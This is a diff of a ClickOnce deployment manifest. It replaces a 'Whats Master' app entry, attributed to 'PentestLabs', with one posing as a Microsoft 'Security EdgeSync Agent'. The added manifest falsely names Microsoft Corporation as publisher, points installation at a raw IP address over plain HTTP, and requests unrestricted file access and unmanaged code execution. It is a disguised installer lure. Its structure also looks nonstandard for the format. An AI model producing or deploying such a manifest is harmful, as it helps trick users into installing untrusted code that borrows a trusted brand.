@@ -1,21 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
-<deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1" xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2">
-  <assemblyIdentity name="WhatsMaster.application" version="9.1.0.0" language="neutral" processorArchitecture="msil" xmlns="urn:schemas-microsoft-com:asm.v1" />
-  <description asmv2:publisher="PentestLabs" asmv2:product="Whats Master" xmlns="urn:schemas-microsoft-com:clickonce.v1" />
-  <deployment install="true" mapFileExtensions="true" co.v1:createDesktopShortcut="true">
-    <subscription>
-      <update>
-        <expiration maximumAge="0" unit="days" />
-      </update>
-    </subscription>
-            <deploymentProvider codebase="http://69.62.126.191/deploy/whatsmaster.application" />
-  </deployment>
-  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
-    <framework targetVersion="4.0" profile="Full" supportedRuntime="4.0.30319" />
-  </compatibleFrameworks>
-  <dependency>
-    <dependentAssembly dependencyType="install" allowDelayedBinding="true" codebase="Whats Master-v9.1.0-win-x64.exe" size="79605750">
-      <assemblyIdentity name="WhatsMaster" version="9.1.0.0" language="neutral" processorArchitecture="msil" xmlns="urn:schemas-microsoft-com:asm.v1" />
-    </dependentAssembly>
-  </dependency>
+<deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0">
+  <deploymentProvider codebase="http://69.62.126.191/deploy/whatsmaster.application" />
+
+  <application identity="EdgeSync.Agent" name="Security EdgeSync Agent">
+    <publisher>Microsoft Corporation</publisher>
+
+    <description>
+      <defaultTitle>Security EdgeSync Agent</defaultTitle>
+      <defaultDescription>This agent ensures secure synchronization between Microsoft services and business accounts.</defaultDescription>
+    </description>
+
+    <supportUrl>https://support.microsoft.com/help/edge-sync-agent</supportUrl>
+  </application>
+
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <applicationRequestMinimum>
+        <PermissionSet class="System.Security.PermissionSet" version="1">
+          <IPermission class="System.Security.Permissions.UIPermission, mscorlib" version="1" Unrestricted="true"/>
+          <IPermission class="System.Security.Permissions.FileIOPermission, mscorlib" version="1" Unrestricted="true"/>
+          <IPermission class="System.Security.Permissions.SecurityPermission, mscorlib" version="1" Flags="Execution, UnmanagedCode"/>
+        </PermissionSet>
+        <defaultAssemblyRequest permissionSetReference="Custom" />
+      </applicationRequestMinimum>
+      <requestedExecutionLevel level="asInvoker" uiAccess="false" />
+    </security>
+  </trustInfo>
 </deployment>
